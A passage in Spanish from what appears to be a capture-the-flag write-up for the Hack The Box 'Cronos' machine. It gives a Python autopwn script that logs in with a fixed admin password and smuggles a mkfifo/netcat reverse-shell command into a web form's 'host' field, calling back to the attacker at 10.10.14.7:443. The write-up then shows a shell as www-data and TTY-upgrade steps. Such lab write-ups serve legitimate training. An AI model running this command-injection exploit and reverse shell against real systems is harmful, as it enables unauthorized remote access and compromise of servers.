## Vuln exploit & Gaining Access {-}

### Autopwn {-}

```python
#!/usr/bin/python3

import requests
import pdb
import signal
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://admin.cronos.htb/index.php"
shell_url = "http://admin.cronos.htb/welcome.php"
lport = 443

def makeRequest():

    s = requests.session()

    post_data = {
        'username': 'admin',
        'password': '1327663704'
    }

    r = s.post(login_url, data=post_data)

    post_data = {
        'command': 'ping -c 1',
        'host': '10.10.14.7; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f'
    }

    r = s.post(shell_url, data=post_data)

if __name__ == '__main__':
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

Si lanzamos en script ganamos accesso al systema.

```bash
whoami

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Tenemos que ver si tenemos que hacer un user pivoting pero como ya tenemos accesso a la flag, no es necessario.
